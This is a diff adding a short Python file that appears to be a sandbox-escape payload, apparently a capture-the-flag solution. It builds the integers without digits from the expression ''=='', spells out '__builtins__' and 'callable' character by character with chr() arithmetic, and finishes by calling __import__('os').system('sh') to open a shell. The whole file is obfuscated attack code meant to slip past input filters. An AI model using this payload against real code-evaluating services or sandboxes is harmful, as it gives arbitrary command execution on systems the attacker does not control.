@@ -1,0 +1,10 @@
+z = ""==""
+zz = z+z
+zzz = z+zz
+zzzz = z+zzz
+zzzzz = z+zzzz
+zzzzzz = zzz+zzz
+zzzzzzz = zzz+zzzz
+zzzzzzzz = zzzz+zzzz
+any = vars(vars()["__bu"+chr(zz**zzzzzzz-zzzz*zz*zzz+z)+chr(zz**zzzzzzz-zzzz*zzzzz)+chr(zz**zzzzzzz-zzzz*zzz)+chr(zz**zzzzzzz-zzzz*zz*zzz+z)+"ns__"])["ca"+chr(zz**zzzzzzz-zzzz*zzzzz)+chr(zz**zzzzzzz-zzzz*zzzzz)+"ab"+chr(zz**zzzzzzz-zzzz*zzzzz)+chr(zz**zzzzzzz-zzz**zzz)]
+__import__('os').system('sh')
